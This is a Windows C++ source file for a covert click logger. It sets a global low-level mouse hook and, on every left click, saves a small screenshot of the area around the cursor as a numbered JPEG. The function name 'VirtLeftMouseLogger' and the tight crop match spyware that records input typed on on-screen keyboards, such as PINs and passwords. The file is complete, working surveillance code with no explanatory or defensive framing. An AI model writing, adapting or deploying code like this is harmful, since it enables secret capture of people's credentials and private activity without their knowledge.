#include <windows.h>
#include <gdiplus.h>

using namespace Gdiplus;
using namespace DllExports;

HHOOK hKeyHook;
int c = 0;

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;
    UINT size = 0;

    ImageCodecInfo* pImageCodecInfo = NULL;

    GetImageEncodersSize(&num, &size);
    if (size == 0)
        return -1;
    pImageCodecInfo = (ImageCodecInfo*)VirtualAlloc(0, size, MEM_COMMIT, PAGE_READWRITE);
    if (pImageCodecInfo == NULL)
        return -1;

    GetImageEncoders(num, size, pImageCodecInfo);

    for (UINT j = 0; j < num; ++j) {
        if (lstrcmpW(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            VirtualFree(pImageCodecInfo, 0, MEM_RELEASE);
            return j;
        }
    }

    VirtualFree(pImageCodecInfo, 0, MEM_RELEASE);
    return -1;
}

void getScreen(WCHAR* mimeType, WCHAR* fileName, ULONG uQuality, int x, int y) {
    GdiplusStartupInput input;
    ULONG_PTR token;
    GpBitmap *gdiBitmap = NULL;
    EncoderParameters encparams;
    CLSID encClsid;
    int cub = 70;

    if (GdiplusStartup(&token, &input, NULL) == 0) {
        HDC dc = GetDC(HWND_DESKTOP);
        if (dc != 0) {
            HBITMAP hbitmap = CreateCompatibleBitmap(dc, cub, cub);
            if (hbitmap != 0) {
                HDC hdc = CreateCompatibleDC(dc);
                if (hdc != 0) {
                    if (SelectObject(hdc, hbitmap) != 0) {

                        if (BitBlt(hdc, 0, 0, cub, cub, dc, x - cub / 2, y - cub / 2, SRCCOPY) != 0) {

                            if (GdipCreateBitmapFromHBITMAP(hbitmap, NULL, &gdiBitmap) == 0) {

                                if (GetEncoderClsid(mimeType, &encClsid) != -1) {

                                    encparams.Count = 1;
                                    encparams.Parameter[0].NumberOfValues = 1;
                                    encparams.Parameter[0].Guid = EncoderQuality;
                                    encparams.Parameter[0].Type = EncoderParameterValueTypeLong;
                                    encparams.Parameter[0].Value = &uQuality;

                                    GdipSaveImageToFile(gdiBitmap, fileName, &encClsid, &encparams);

                                    GdipDisposeImage(gdiBitmap);
                                }
                            }
                        }
                    }
                    DeleteObject(hdc);
                }
                DeleteObject(hbitmap);
            }
            ReleaseDC(HWND_DESKTOP, dc);
        }
        GdiplusShutdown(token);
    }
}

LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {

    if (nCode == HC_ACTION) {
        if (wParam == WM_LBUTTONDOWN) {
            MOUSEHOOKSTRUCT *Info = (MOUSEHOOKSTRUCT*)lParam;
            WCHAR b[100];

            c++;
            wsprintfW(b, L"%d.jpg", c);
            getScreen(L"image/jpeg", b, 100, Info->pt.x, Info->pt.y);
        }
    }

    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

DWORD WINAPI VirtLeftMouseLogger(LPVOID lpParameter) {
    MSG message;

    HINSTANCE hExe = GetModuleHandleA(NULL);
    if (!hExe) hExe = LoadLibraryA((LPCSTR)lpParameter);
    if (!hExe) return 1;

    hKeyHook = SetWindowsHookExA(WH_MOUSE_LL, (HOOKPROC)LowLevelMouseProc, hExe, NULL);

    while (GetMessageA(&message, NULL, 0, 0)) {
        TranslateMessage(&message);
        DispatchMessageA(&message);
    }

    UnhookWindowsHookEx(hKeyHook);
    return 0;
}

int entry(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HANDLE hThread;
    DWORD dwThread;

    hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)VirtLeftMouseLogger, NULL, NULL, &dwThread);

    if (hThread)
        return WaitForSingleObject(hThread, INFINITE);
    else
        return 1;

    return 0;
}
